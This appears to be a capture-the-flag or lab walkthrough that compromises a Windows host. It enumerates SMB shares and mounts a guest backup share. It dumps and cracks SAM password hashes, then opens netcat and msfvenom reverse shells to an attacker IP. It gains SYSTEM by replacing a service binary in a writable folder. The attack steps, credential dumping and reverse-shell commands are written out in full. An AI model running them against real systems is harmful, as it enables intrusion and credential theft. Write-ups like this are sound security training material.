
```zsh
nmap --script smb-enum-shares -p139,445 -T4 -Pn 172.31.1.18                                                                             [4/6685]
                                                                                                                        
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-10 12:42 EDT                                                         
Nmap scan report for 172.31.1.18                                                                                        
Host is up (0.16s latency).                                                                                             
                              
PORT    STATE SERVICE  
139/tcp open  netbios-ssn 
445/tcp open  microsoft-ds                                  
                              
Host script results:                                        
| smb-enum-shares:                                          
|   account_used: guest
|   \\172.31.1.18\ADMIN$:                                   
|     Type: STYPE_DISKTREE_HIDDEN                                                     
|     Comment: Remote Admin                                 
|     Anonymous access: <none>   
|     Current user access: <none>                                                     
|   \\172.31.1.18\C$:                      
|     Type: STYPE_DISKTREE_HIDDEN                                                     
|     Comment: Default share               
|     Anonymous access: <none>                                                        
|     Current user access: <none>                                                     
|   \\172.31.1.18\IPC$:                    
|     Type: STYPE_IPC_HIDDEN               
|     Comment: Remote IPC                  
|     Anonymous access: READ/WRITE                                                    
|     Current user access: READ/WRITE                                                 
|   \\172.31.1.18\backups:                 
|     Type: STYPE_DISKTREE                 
|     Comment:                             
|     Anonymous access: READ               
|_    Current user access: READ


```

```zsh
mount -t cifs //172.31.1.8/backup -o user=guest,password= /mnt/sam
```
```zsh
cd /mnt/sam/Windows/System32/config
```
Copy SAM and SYSTEM File to crack

```zsh

 ./pwdump.py SYSTEM SAM                                                                                                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                      
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                              
jamie:1001:aad3b435b51404eeaad3b435b51404ee:68b1d3b0493ec0d6a1c0b8725062ab71:::                                                                                             
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:661e39b67cabec9066e1de26094770ab:::
```
Cracking the Hash

```zsh
hashcat -m 1000 68b1d3b0493ec0d6a1c0b8725062ab71 /usr/share/wordlists/rockyou.txt
```
Cracked hash:

```68b1d3b0493ec0d6a1c0b8725062ab71:rangers ```


5985 is running so evil-winrm

Get-Service doesnot work, services work.

winpeas or powerup doesnot give us anything.

Manual enumeration is the way.Upload nc and get out of Powershell. 

```cmd
./nc.exe -e cmd.exe 10.10.0.40 443
```

```                                                                                                                        
c:\Services>icacls "c:\Services"                                                                                        
icacls "c:\Services"                                                                                                    
c:\Services BUILTIN\Users:(OI)(CI)(F)                                                                                   
            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)                                                                          
            BUILTIN\Administrators:(I)(OI)(CI)(F)                                                                       
            BUILTIN\Users:(I)(OI)(CI)(RX)                                                                               
            BUILTIN\Users:(I)(CI)(AD)                                                                                   
            BUILTIN\Users:(I)(CI)(WD)                                                                                   
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

```zsh
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.40 LPORT=53 -f exe > monitor1.exe
```
Start a listener on port 53 on your kali machine
upload it, sc start monitor1 and you will have a System shell